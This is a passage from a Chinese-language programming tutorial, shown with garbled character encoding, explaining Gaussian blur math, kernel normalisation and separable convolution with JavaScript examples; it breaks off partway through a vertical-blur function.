  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:48:51.000Z" title="Thu Jan 01 2026 10:48:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»22åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é«˜æ–¯æ¨¡ç³Š(Gaussian Blur)æ˜¯å›¾åƒå¤„ç†ä¸­æœ€å¸¸ç”¨çš„æ¨¡ç³Šç®—æ³•ï¼Œé€šè¿‡å¯¹åƒç´ å‘¨å›´åŒºåŸŸè¿›è¡ŒåŠ æƒå¹³å‡æ¥å®ç°å¹³æ»‘æ•ˆæœã€‚ä¼ ç»Ÿçš„é«˜æ–¯æ¨¡ç³Šéœ€è¦å¯¹æ¯ä¸ªåƒç´ é‡‡æ ·å¤šæ¬¡ï¼Œè®¡ç®—æˆæœ¬è¾ƒé«˜ã€‚çº¿æ€§é‡‡æ ·(Linear Sampling)æ˜¯ä¸€ç§ä¼˜åŒ–æŠ€æœ¯ï¼Œåˆ©ç”¨ GPU çš„çº¹ç†æ’å€¼ç‰¹æ€§ï¼Œå¯ä»¥å°†é‡‡æ ·æ¬¡æ•°å‡å°‘çº¦ä¸€åŠï¼Œæ˜¾è‘—æå‡æ€§èƒ½ã€‚æœ¬æ–‡å°†è¯¦ç»†è®²è§£é«˜æ–¯æ¨¡ç³Šçš„æ•°å­¦åŸç†ã€çº¿æ€§é‡‡æ ·ä¼˜åŒ–æ–¹æ³•ï¼Œå¹¶é€šè¿‡ JavaScript æ¨¡æ‹Ÿå’Œå®Œæ•´çš„ WebGL ç¤ºä¾‹å±•ç¤ºå®ç°è¿‡ç¨‹ã€‚</p>
<h2 data-id="heading-0">é«˜æ–¯æ¨¡ç³Šçš„æ•°å­¦åŸç†</h2>
<p>è¦ç†è§£çº¿æ€§é‡‡æ ·ä¼˜åŒ–ï¼Œé¦–å…ˆéœ€è¦ææ¸…æ¥šé«˜æ–¯æ¨¡ç³Šåˆ°åº•åœ¨åšä»€ä¹ˆã€‚ç®€å•æ¥è¯´ï¼Œæ¨¡ç³Šå°±æ˜¯è®©ä¸€ä¸ªåƒç´ å—å‘¨å›´åƒç´ å½±å“ï¼Œä½†å…³é”®é—®é¢˜æ˜¯ï¼š<strong>å¦‚ä½•å†³å®šæ¯ä¸ªå‘¨å›´åƒç´ çš„å½±å“ç¨‹åº¦ï¼Ÿ</strong></p>
<h3 data-id="heading-1">ä»é—®é¢˜å‡ºå‘ï¼šä¸ºä»€ä¹ˆè¦ç”¨é«˜æ–¯å‡½æ•°</h3>
<p>å‡è®¾æˆ‘ä»¬è¦æ¨¡ç³Šä¸€ä¸ªåƒç´ ï¼Œæœ€ç®€å•çš„åšæ³•æ˜¯æŠŠå®ƒå’Œå‘¨å›´åƒç´ å–å¹³å‡å€¼ã€‚æ¯”å¦‚å‘¨å›´æœ‰ 8 ä¸ªåƒç´ ï¼Œå°±æŠŠ 9 ä¸ªåƒç´ åŠ èµ·æ¥é™¤ä»¥ 9ã€‚è¿™ç§æ–¹æ³•å«å‡å€¼æ¨¡ç³Š(Box Blur)ï¼Œä½†æ•ˆæœå¾ˆç”Ÿç¡¬â€”â€”æƒ³è±¡ä¸€ä¸‹ï¼Œè·ç¦»ä½  1 ç±³å’Œè·ç¦»ä½  10 ç±³çš„ç‰©ä½“ï¼Œéš¾é“å¯¹ä½ çš„å½±å“æ˜¯ä¸€æ ·çš„å—ï¼Ÿ</p>
<p>é«˜æ–¯æ¨¡ç³Šçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>è·ç¦»è¶Šè¿‘ï¼Œå½±å“è¶Šå¤§ï¼›è·ç¦»è¶Šè¿œï¼Œå½±å“è¶Šå°ï¼›è€Œä¸”è¿™ä¸ªå½±å“æ˜¯å¹³æ»‘è¿‡æ¸¡çš„</strong>ã€‚é«˜æ–¯å‡½æ•°æ­£å¥½ç¬¦åˆè¿™ä¸ªè¦æ±‚ã€‚</p>
<p>ä¸€ç»´é«˜æ–¯å‡½æ•°çš„å½¢å¼æ˜¯ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">gaussian1D</span>(<span class="hljs-params">x, sigma</span>) {
  <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> / (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(<span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>) * sigma)) * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">exp</span>(-(x * x) / (<span class="hljs-number">2</span> * sigma * sigma));
}
</code></pre>
<p>è¿™é‡Œ <code>x</code> æ˜¯è·ç¦»ä¸­å¿ƒçš„åç§»é‡ï¼Œ<code>sigma</code> æ˜¯æ ‡å‡†å·®ã€‚å½“ <code>x = 0</code>ï¼ˆä¸­å¿ƒç‚¹ï¼‰æ—¶å‡½æ•°å€¼æœ€å¤§ï¼Œéšç€ <code>|x|</code> å¢å¤§å‡½æ•°å€¼å‘ˆæŒ‡æ•°è¡°å‡ã€‚</p>
<p>å¯¹äºäºŒç»´å›¾åƒï¼Œæˆ‘ä»¬éœ€è¦äºŒç»´é«˜æ–¯å‡½æ•°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">gaussian2D</span>(<span class="hljs-params">x, y, sigma</span>) {
  <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> / (<span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * sigma * sigma)) * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">exp</span>(-(x * x + y * y) / (<span class="hljs-number">2</span> * sigma * sigma));
}
</code></pre>
<p>ä½†è¿™é‡Œæœ‰ä¸ªéå¸¸é‡è¦çš„æ€§è´¨ï¼š<strong>äºŒç»´é«˜æ–¯å¯ä»¥åˆ†è§£ä¸ºä¸¤ä¸ªä¸€ç»´é«˜æ–¯çš„ä¹˜ç§¯</strong>ï¼Œå³ <code>G(x, y) = G(x) * G(y)</code>ã€‚è¿™ä¸ªç‰¹æ€§å«ä½œå¯åˆ†ç¦»æ€§(Separability)ï¼Œåé¢ä¼šçœ‹åˆ°å®ƒå¦‚ä½•å¸®åŠ©æˆ‘ä»¬ä¼˜åŒ–æ€§èƒ½ã€‚</p>
<h3 data-id="heading-2">ä»å‡½æ•°åˆ°æ•°ç»„ï¼šç”Ÿæˆå·ç§¯æ ¸</h3>
<p>çŸ¥é“äº†é«˜æ–¯å‡½æ•°ï¼Œä¸‹ä¸€ä¸ªé—®é¢˜æ˜¯ï¼š<strong>å¦‚ä½•åœ¨ç¦»æ•£çš„åƒç´ ç½‘æ ¼ä¸Šåº”ç”¨å®ƒï¼Ÿ</strong></p>
<p>å›¾åƒä¸æ˜¯è¿ç»­çš„æ•°å­¦å¹³é¢ï¼Œè€Œæ˜¯ç”±ä¸€ä¸ªä¸ªç‹¬ç«‹åƒç´ ç»„æˆçš„ç½‘æ ¼ã€‚æˆ‘ä»¬éœ€è¦æŠŠè¿ç»­çš„é«˜æ–¯å‡½æ•°"ç¦»æ•£åŒ–"æˆä¸€ä¸ªå…·ä½“çš„æƒé‡æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„å°±å«å·ç§¯æ ¸(Kernel)ã€‚</p>
<p>å·ç§¯æ ¸çš„å¤§å°é€šå¸¸æ˜¯ <code>2 * radius + 1</code>ã€‚æ¯”å¦‚ <code>radius = 3</code>ï¼Œå·ç§¯æ ¸å°±æœ‰ 7 ä¸ªå…ƒç´ ï¼Œå¯¹åº”ä¸­å¿ƒåƒç´ å·¦å³å„ 3 ä¸ªåƒç´ çš„æƒé‡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateGaussianKernel</span>(<span class="hljs-params">radius, sigma</span>) {
  <span class="hljs-keyword">const</span> kernelSize = <span class="hljs-number">2</span> * radius + <span class="hljs-number">1</span>;
  <span class="hljs-keyword">const</span> kernel = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(kernelSize);
  <span class="hljs-keyword">let</span> sum = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// è®¡ç®—æ¯ä¸ªä½ç½®çš„æƒé‡</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernelSize; i++) {
    <span class="hljs-keyword">const</span> x = i - radius; <span class="hljs-comment">// åç§»é‡ï¼š-radius åˆ° +radius</span>
    kernel[i] = <span class="hljs-title function_">gaussian1D</span>(x, sigma);
    sum += kernel[i];
  }

  <span class="hljs-comment">// å½’ä¸€åŒ–ï¼šè®©æ‰€æœ‰æƒé‡ä¹‹å’Œä¸º 1</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; kernelSize; i++) {
    kernel[i] /= sum;
  }

  <span class="hljs-keyword">return</span> kernel;
}

<span class="hljs-comment">// ç”ŸæˆåŠå¾„ä¸º 3ã€æ ‡å‡†å·®ä¸º 1.5 çš„å·ç§¯æ ¸</span>
<span class="hljs-keyword">const</span> kernel = <span class="hljs-title function_">generateGaussianKernel</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(kernel);
<span class="hljs-comment">// [0.015, 0.094, 0.235, 0.312, 0.235, 0.094, 0.015]</span>
<span class="hljs-comment">// å¯ä»¥çœ‹åˆ°ä¸­å¿ƒæƒé‡ 0.312 æœ€å¤§ï¼Œå‘ä¸¤è¾¹å¯¹ç§°é€’å‡</span>
</code></pre>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå…³é”®æ­¥éª¤éœ€è¦è§£é‡Šã€‚</p>
<p>**ç¬¬ä¸€ï¼Œä¸ºä»€ä¹ˆè¦éå†è®¡ç®—æƒé‡ï¼Ÿ**å› ä¸ºå›¾åƒæ˜¯ç¦»æ•£çš„ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæ¯ä¸ªæ•´æ•°åç§»ä½ç½®è®¡ç®—ä¸€ä¸ªå…·ä½“çš„æƒé‡å€¼ã€‚</p>
<p>**ç¬¬äºŒï¼Œä¸ºä»€ä¹ˆè¦å½’ä¸€åŒ–ï¼Ÿ**æ³¨æ„ä»£ç ä¸­æœ€åä¸€æ­¥æŠŠæ‰€æœ‰æƒé‡éƒ½é™¤ä»¥å®ƒä»¬çš„æ€»å’Œã€‚è¿™æ ·åšæ˜¯ä¸ºäº†ä¿è¯ <code>sum(weights) = 1</code>ã€‚å¦‚æœä¸å½’ä¸€åŒ–ä¼šæ€æ ·ï¼Ÿå‡è®¾æƒé‡ä¹‹å’Œæ˜¯ 1.2ï¼Œé‚£æ¨¡ç³Šåæ¯ä¸ªåƒç´ å€¼éƒ½ä¼šä¹˜ä»¥ 1.2ï¼Œæ•´ä¸ªå›¾åƒä¼šå˜äº®ï¼›å¦‚æœæƒé‡ä¹‹å’Œæ˜¯ 0.8ï¼Œå›¾åƒä¼šå˜æš—ã€‚å½’ä¸€åŒ–ç¡®ä¿æ¨¡ç³Šå‰åå›¾åƒçš„æ•´ä½“äº®åº¦ä¸å˜ã€‚</p>
<h3 data-id="heading-3">æ ‡å‡†å·®çš„ä½œç”¨ï¼šæ§åˆ¶æ¨¡ç³Šå¼ºåº¦</h3>
<p>å‰é¢æåˆ°çš„ <code>sigma</code>ï¼ˆæ ‡å‡†å·®ï¼‰æ˜¯æ§åˆ¶æ¨¡ç³Šå¼ºåº¦çš„å…³é”®å‚æ•°ã€‚å®ƒå†³å®šäº†é«˜æ–¯åˆ†å¸ƒçš„"èƒ–ç˜¦"ï¼š</p>
<ul>
<li><strong>sigma å°</strong>ï¼šé«˜æ–¯æ›²çº¿é™¡å³­ï¼Œæƒé‡é›†ä¸­åœ¨ä¸­å¿ƒé™„è¿‘ â†’ æ¨¡ç³ŠèŒƒå›´å°ï¼Œæ•ˆæœè½»å¾®</li>
<li><strong>sigma å¤§</strong>ï¼šé«˜æ–¯æ›²çº¿å¹³ç¼“ï¼Œè¿œå¤„ä»æœ‰è¾ƒå¤§æƒé‡ â†’ æ¨¡ç³ŠèŒƒå›´å¤§ï¼Œæ•ˆæœæ˜æ˜¾</li>
</ul>

























<table><thead><tr><th>sigma</th><th>æ•ˆæœ</th><th>å…¸å‹åº”ç”¨</th></tr></thead><tbody><tr><td>0.5 - 1.0</td><td>è½»å¾®æ¨¡ç³Š</td><td>æŠ—é”¯é½¿ã€é™å™ª</td></tr><tr><td>1.5 - 3.0</td><td>ä¸­ç­‰æ¨¡ç³Š</td><td>å¸¸è§„æ¨¡ç³Šæ•ˆæœ</td></tr><tr><td>3.0+</td><td>å¼ºçƒˆæ¨¡ç³Š</td><td>èƒŒæ™¯è™šåŒ–ã€è‰ºæœ¯æ»¤é•œ</td></tr></tbody></table>
<p>å®è·µä¸­ï¼Œ<code>radius</code> å’Œ <code>sigma</code> é€šå¸¸æœ‰ä¸ªç»éªŒå…³ç³»ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">radius = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(sigma * <span class="hljs-number">3</span>);
</code></pre>
<p>ä¸ºä»€ä¹ˆæ˜¯ 3 å€ï¼Ÿå› ä¸ºåœ¨é«˜æ–¯åˆ†å¸ƒä¸­ï¼Œè·ç¦»ä¸­å¿ƒ <code>3 * sigma</code> çš„èŒƒå›´è¦†ç›–äº† 99.7% çš„åˆ†å¸ƒåŒºåŸŸã€‚è¶…å‡ºè¿™ä¸ªèŒƒå›´çš„æƒé‡å·²ç»å°åˆ°å¯ä»¥å¿½ç•¥ï¼Œç»§ç»­å¢å¤§ <code>radius</code> åªä¼šæµªè´¹è®¡ç®—ï¼Œè€Œä¸ä¼šæ˜æ˜¾æ”¹å–„æ•ˆæœã€‚</p>
<h2 data-id="heading-4">ä¼ ç»Ÿé«˜æ–¯æ¨¡ç³Šçš„å®ç°</h2>
<p>æœ‰äº†å·ç§¯æ ¸ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¦‚ä½•ç”¨å®ƒæ¥å¤„ç†å›¾åƒã€‚æœ€ç›´æ¥çš„åšæ³•æ˜¯äºŒç»´å·ç§¯ï¼Œä½†è¿™æ ·åšæ€§èƒ½å¾ˆå·®ã€‚åˆ©ç”¨é«˜æ–¯å‡½æ•°çš„å¯åˆ†ç¦»æ€§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠäºŒç»´å·ç§¯æ‹†åˆ†æˆä¸¤æ¬¡ä¸€ç»´å·ç§¯ï¼Œå¤§å¹…é™ä½è®¡ç®—é‡ã€‚</p>
<h3 data-id="heading-5">äºŒç»´å·ç§¯ï¼šæœ€ç›´æ¥ä½†æœ€æ…¢çš„æ–¹æ³•</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª 5x5 çš„äºŒç»´å·ç§¯æ ¸ï¼ˆ<code>radius = 2</code>ï¼‰ï¼Œè¦æ¨¡ç³Šä¸€ä¸ªåƒç´ ï¼Œéœ€è¦å¯¹å‘¨å›´ 25 ä¸ªåƒç´ è¿›è¡ŒåŠ æƒæ±‚å’Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blur2D</span>(<span class="hljs-params">imageData, x, y, kernel2D, radius</span>) {
  <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>,
    g = <span class="hljs-number">0</span>,
    b = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> width = imageData.<span class="hljs-property">width</span>;
  <span class="hljs-keyword">const</span> data = imageData.<span class="hljs-property">data</span>;

  <span class="hljs-comment">// éå†å·ç§¯æ ¸è¦†ç›–çš„æ‰€æœ‰åƒç´ </span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> ky = -radius; ky &lt;= radius; ky++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> kx = -radius; kx &lt;= radius; kx++) {
      <span class="hljs-keyword">const</span> px = x + kx;
      <span class="hljs-keyword">const</span> py = y + ky;

      <span class="hljs-comment">// è·å–åƒç´ ç´¢å¼•</span>
      <span class="hljs-keyword">const</span> idx = (py * width + px) * <span class="hljs-number">4</span>;

      <span class="hljs-comment">// è·å–å·ç§¯æ ¸æƒé‡</span>
      <span class="hljs-keyword">const</span> weight = kernel2D[ky + radius][kx + radius];

      <span class="hljs-comment">// åŠ æƒç´¯åŠ </span>
      r += data[idx] * weight;
      g += data[idx + <span class="hljs-number">1</span>] * weight;
      b += data[idx + <span class="hljs-number">2</span>] * weight;
    }
  }

  <span class="hljs-keyword">return</span> [r, g, b];
}
</code></pre>
<p>è¿™ä¸ªæ–¹æ³•çš„é—®é¢˜å¾ˆæ˜æ˜¾ï¼š<strong>å¯¹äºåŠå¾„ä¸º <code>r</code> çš„å·ç§¯æ ¸ï¼Œæ¯ä¸ªåƒç´ éœ€è¦é‡‡æ · <code>(2r + 1)Â²</code> æ¬¡</strong>ã€‚å¦‚æœ <code>r = 10</code>ï¼Œå°±éœ€è¦ 441 æ¬¡é‡‡æ ·ï¼å¯¹äºä¸€å¼  1920x1080 çš„å›¾ç‰‡ï¼Œæ€»è®¡ç®—é‡æ˜¯å¤©æ–‡æ•°å­—ã€‚</p>
<h3 data-id="heading-6">å¯åˆ†ç¦»å·ç§¯ï¼šæ€§èƒ½çš„å…³é”®çªç ´</h3>
<p>è¿˜è®°å¾—å‰é¢æåˆ°çš„é«˜æ–¯å‡½æ•°å¯åˆ†ç¦»æ€§å—ï¼Ÿ<code>G(x, y) = G(x) * G(y)</code> è¿™ä¸ªæ€§è´¨è®©æˆ‘ä»¬å¯ä»¥æŠŠäºŒç»´å·ç§¯æ‹†åˆ†æˆä¸¤æ¬¡ä¸€ç»´å·ç§¯ï¼š</p>
<ol>
<li><strong>ç¬¬ä¸€éï¼ˆæ°´å¹³æ–¹å‘ï¼‰</strong>ï¼šå¯¹æ¯ä¸€è¡Œåº”ç”¨ä¸€ç»´å·ç§¯æ ¸</li>
<li><strong>ç¬¬äºŒéï¼ˆå‚ç›´æ–¹å‘ï¼‰</strong>ï¼šå¯¹ç¬¬ä¸€éçš„ç»“æœï¼Œå¯¹æ¯ä¸€åˆ—åº”ç”¨ä¸€ç»´å·ç§¯æ ¸</li>
</ol>
<p>ä¸ºä»€ä¹ˆè¿™æ ·èƒ½æé«˜æ€§èƒ½ï¼Ÿè®©æˆ‘ä»¬ç®—ä¸€ç¬”è´¦ï¼š</p>
<ul>
<li><strong>äºŒç»´å·ç§¯</strong>ï¼šæ¯ä¸ªåƒç´ é‡‡æ · <code>(2r + 1)Â²</code> æ¬¡</li>
<li><strong>å¯åˆ†ç¦»å·ç§¯</strong>ï¼šæ¯ä¸ªåƒç´ åœ¨ä¸¤æ¬¡ä¸€ç»´å·ç§¯ä¸­åˆ†åˆ«é‡‡æ · <code>(2r + 1)</code> æ¬¡ï¼Œæ€»å…± <code>2 * (2r + 1)</code> æ¬¡</li>
</ul>
<p>å¯¹æ¯”ï¼š</p>



































<table><thead><tr><th>åŠå¾„ r</th><th>äºŒç»´å·ç§¯é‡‡æ ·æ¬¡æ•°</th><th>å¯åˆ†ç¦»å·ç§¯é‡‡æ ·æ¬¡æ•°</th><th>æ€§èƒ½æå‡</th></tr></thead><tbody><tr><td>3</td><td>49</td><td>14</td><td>3.5x</td></tr><tr><td>5</td><td>121</td><td>22</td><td>5.5x</td></tr><tr><td>10</td><td>441</td><td>42</td><td>10.5x</td></tr><tr><td>20</td><td>1681</td><td>82</td><td>20.5x</td></tr></tbody></table>
<p>åŠå¾„è¶Šå¤§ï¼Œå¯åˆ†ç¦»å·ç§¯çš„ä¼˜åŠ¿è¶Šæ˜æ˜¾ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå®é™…åº”ç”¨ä¸­å‡ ä¹ä»ä¸ä½¿ç”¨äºŒç»´å·ç§¯ã€‚</p>
<h3 data-id="heading-7">ä»£ç å®ç°ï¼šæ°´å¹³å’Œå‚ç›´ä¸¤æ¬¡æ¨¡ç³Š</h3>
<p>ä¸‹é¢æ˜¯å¯åˆ†ç¦»å·ç§¯çš„å®Œæ•´å®ç°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ°´å¹³æ–¹å‘æ¨¡ç³Š</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">blurHorizontal</span>(<span class="hljs-params">imageData, kernel, radius</span>) {
  <span class="hljs-keyword">const</span> width = imageData.<span class="hljs-property">width</span>;
  <span class="hljs-keyword">const</span> height = imageData.<span class="hljs-property">height</span>;
  <span class="hljs-keyword">const</span> data = imageData.<span class="hljs-property">data</span>;
  <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
      <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>,
        g = <span class="hljs-number">0</span>,
        b = <span class="hljs-number">0</span>,
        a = <span class="hljs-number">0</span>;

      <span class="hljs-comment">// å¯¹æ°´å¹³æ–¹å‘çš„åƒç´ åŠ æƒæ±‚å’Œ</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> kx = -radius; kx &lt;= radius; kx++) {
        <span class="hljs-keyword">const</span> px = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(x + kx, <span class="hljs-number">0</span>), width - <span class="hljs-number">1</span>); <span class="hljs-comment">// è¾¹ç•Œå¤„ç†</span>
        <span class="hljs-keyword">const</span> idx = (y * width + px) * <span class="hljs-number">4</span>;
        <span class="hljs-keyword">const</span> weight = kernel[kx + radius];

        r += data[idx] * weight;
        g += data[idx + <span class="hljs-number">1</span>] * weight;
        b += data[idx + <span class="hljs-number">2</span>] * weight;
        a += data[idx + <span class="hljs-number">3</span>] * weight;
      }

      <span class="hljs-keyword">const</span> outIdx = (y * width + x) * <span class="hljs-number">4</span>;
      output[outIdx] = r;
      output[outIdx + <span class="hljs-number">1</span>] = g;
      output[outIdx + <span class="hljs-number">2</span>] = b;
      output[outIdx + <span class="hljs-number">3</span>] = a;
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageData</span>(output, width, height);
}

<span class="hljs-comment">// å‚ç›´æ–¹å‘æ¨¡ç³Š</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">blurVertical</span>(<span class="hljs-params">imageData, kernel, radius</span>) {
  <span class="hljs-keyword">const</span> width = imageData.<span class="hljs-property">width</span>;
  <span class="hljs-keyword">const</span> height = imageData.<span class="hljs-property">height</span>;
  <span class="hljs-keyword">const</span> data = imageData.<span class="hljs-property">data</span>;
  <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8ClampedArray</span>(data.<span class="hljs-property">length</span>);

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> y = <span class="hljs-number">0</span>; y &lt; height; y++) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>; x &lt; width; x++) {
      <span class="hljs-keyword">let</span> r = <span class="hljs-number">0</span>,
        g = <span class="hljs-number">0</span>,
        b = <span class="hljs-number">0</span>,
        a = <span class="hljs-number">0</span>;

      <span class="hljs-comment">// å¯¹å‚ç›´æ–¹å‘çš„åƒç´ åŠ æƒæ±‚å’Œ</span>
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> ky = -radius; ky &lt;= radius; ky++) {
        <span class="hljs-keyword">const</span> py = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(y + ky, <span class="hljs-number">0</span>), height - <span class="hljs-number">1</span>); <span class="hljs-comment">// è¾¹ç•Œå¤„ç†</span>
        <span class="hljs-keyword">const</span> idx = (py * width + x) * <span class="hljs-number">4</span>;
        <span class="hljs-keyword">const</span> weight = kernel[ky + radius];

        r += data[idx] * weight;
        g += data[idx + <span class="hljs-number">1</span>] * weight;
        b += data[idx + <span class="hljs-number">2</span>] * weight;
        a += data[idx + <span class="hljs-number">3</span>] * weight;
      }

